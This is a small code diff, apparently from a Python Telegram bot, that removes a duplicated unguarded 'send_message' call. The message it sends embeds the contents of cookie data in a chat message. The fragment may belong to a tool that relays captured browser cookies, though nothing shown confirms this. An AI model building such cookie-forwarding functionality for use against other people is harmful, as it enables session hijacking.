@@ -1257,7 +1257,6 @@ def handle_callback(call):
                 f"{cookie_content.strip()}"
                 f"</pre>"
             )
-            bot.send_message(chat_id, header_text, parse_mode="HTML")
             try:
                 bot.send_message(chat_id, header_text, parse_mode="HTML")
             except Exception as e:
